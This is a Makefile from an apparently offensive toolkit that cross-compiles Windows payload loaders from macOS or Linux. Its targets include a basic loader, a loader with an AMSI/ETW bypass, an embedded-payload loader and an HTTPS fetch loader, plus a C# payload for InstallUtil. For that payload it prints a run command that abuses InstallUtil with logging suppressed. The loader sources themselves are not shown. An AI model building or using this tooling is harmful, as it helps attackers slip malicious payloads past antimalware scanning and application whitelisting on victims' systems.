# Cross-compilation Makefile — builds Windows PE from macOS or Linux
#
# Prerequisites:
#   macOS:  brew install mingw-w64
#   Linux:  apt install mingw-w64
#   C# (InstallUtil payload): brew install mono  (or apt install mono-devel)
#
# Usage:
#   make                 — build all C++ loaders (64-bit)
#   make loader          — basic loader (no patches)
#   make patched         — loader with AMSI/ETW bypass
#   make embedded        — embedded payload loader
#   make https           — HTTPS fetch loader
#   make installutil     — compile InstallUtil C# payload with Mono
#   make all32           — 32-bit variants
#   make clean

CC64    = x86_64-w64-mingw32-g++
CC32    = i686-w64-mingw32-g++
STRIP64 = x86_64-w64-mingw32-strip
STRIP32 = i686-w64-mingw32-strip
MCS     = mcs

CFLAGS  = -O2 -Wall -static-libgcc -static-libstdc++ -municode
LDFLAGS = -loleaut32 -lole32

.PHONY: all clean loader patched embedded https installutil all32

all: loader patched embedded https

# --- 64-bit targets ---

loader: loader.exe
loader.exe: mingw_loader.cpp
	$(CC64) $(CFLAGS) -o $@ $< $(LDFLAGS)
	$(STRIP64) $@
	@echo "[+] $@ (basic loader, x86_64)"

patched: loader_patched.exe
loader_patched.exe: loader_patched.cpp patches.h
	$(CC64) $(CFLAGS) -o $@ $< $(LDFLAGS)
	$(STRIP64) $@
	@echo "[+] $@ (AMSI/ETW bypass, x86_64)"

embedded: loader_embedded.exe
loader_embedded.exe: loader_embedded.cpp
	$(CC64) $(CFLAGS) -o $@ $< $(LDFLAGS)
	$(STRIP64) $@
	@echo "[+] $@ (embedded payload, x86_64)"

https: loader_https.exe
loader_https.exe: loader_https.cpp
	$(CC64) $(CFLAGS) -o $@ $< $(LDFLAGS) -lwinhttp
	$(STRIP64) $@
	@echo "[+] $@ (HTTPS fetch, x86_64)"

# --- C# InstallUtil payload (compile with Mono) ---

installutil: payload.dll
payload.dll: installutil_payload.cs
	$(MCS) -target:library -r:System.Configuration.Install -out:$@ $<
	@echo "[+] $@ (InstallUtil payload)"
	@echo "    Run: InstallUtil.exe /logfile= /LogToConsole=false /U $@"

# --- 32-bit variants ---

all32: loader32.exe loader_patched32.exe

loader32.exe: mingw_loader.cpp
	$(CC32) $(CFLAGS) -o $@ $< $(LDFLAGS)
	$(STRIP32) $@
	@echo "[+] $@ (basic loader, i686)"

loader_patched32.exe: loader_patched.cpp patches.h
	$(CC32) $(CFLAGS) -o $@ $< $(LDFLAGS)
	$(STRIP32) $@
	@echo "[+] $@ (AMSI/ETW bypass, i686)"

# --- Debug ---

debug: loader_patched.cpp patches.h
	$(CC64) -g -O0 -Wall -static-libgcc -static-libstdc++ -municode -o loader_debug.exe $< $(LDFLAGS)
	@echo "[+] loader_debug.exe (debug, x86_64)"

clean:
	rm -f *.exe payload.dll
